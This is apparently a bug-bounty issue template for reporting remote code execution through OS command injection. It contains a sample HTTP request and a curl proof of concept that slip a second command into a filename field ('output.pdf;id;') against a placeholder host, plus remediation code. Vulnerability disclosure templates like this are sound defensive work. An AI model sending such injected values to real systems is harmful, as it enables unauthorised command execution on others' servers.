---
name: "SOP-03: Remote Code Execution (RCE / Command Injection)"
about: "Rapid reporting template for critical OS command injection and arbitrary code execution flaws."
title: "[RCE] Remote Code Execution via <Component/Parameter>"
labels: ["vulnerability-advisory", "rce", "p0-critical"]
assignees: []
---

## 🛡️ Vulnerability Title
**[RCE] Arbitrary Remote Code Execution via `[Parameter/Function]` in `[Vulnerable Component]`**

---

### 1. Executive Summary
A critical Remote Code Execution (RCE) flaw was discovered in `[Target Program / Subsystem]`. Due to unsanitized input passed to a system shell or runtime evaluator (`subprocess`, `os.system`, `eval`, or unsafe deserializer), an attacker can supply crafted payloads that execute arbitrary commands on the underlying host server under the context of the running application process.

---

### 2. Vulnerability & Impact Classification
- **Target Platform:** HackerOne / Bugcrowd / GitHub
- **Asset / URL:** `https://worker.target.com/jobs/process`
- **Vulnerability Class:** CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Base Score:** **9.8 (Critical)**
- **Severity Tier:** Critical (P0)

---

### 3. Vulnerable Component & Vector
- **Affected Route / Endpoint:** `POST /api/v1/tools/convert_format`
- **Vulnerable Parameter:** `filename` or `format_option`
- **Execution Mechanism:** Unescaped shell execution (`shell=True` or `exec()`)

---

### 4. Non-Destructive Step-by-Step Reproduction
*(Note: Only harmless validation commands such as `id`, `whoami`, or DNS pingback were executed in accordance with bounty program policies.)*

1. Send the following HTTP request with a harmless payload:
```http
POST /api/v1/tools/convert_format HTTP/1.1
Host: worker.target.com
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "source_url": "https://example.com/sample.pdf",
  "filename": "output.pdf;id;"
}
```

2. Inspect the HTTP response body:
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "completed",
  "debug_output": "uid=1001(appuser) gid=1001(appuser) groups=1001(appuser)"
}
```
3. The command output demonstrates full arbitrary command execution on the host.

---

### 5. Curl Proof of Concept
```bash
curl -ik -s -X POST "https://worker.target.com/api/v1/tools/convert_format" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"source_url":"https://example.com","filename":"test.pdf;id;"}'
```

---

### 6. Remediation Guidance
Never invoke system commands via string concatenation in a shell interpreter. Use parameter lists with standard libraries:

```python
# Remediation Pattern (Python subprocess)
# VULNERABLE:
# subprocess.run(f"convert {source} {filename}", shell=True)

# SECURE:
import shlex
subprocess.run(["convert", source_file, safe_output_path], shell=False, check=True)
```
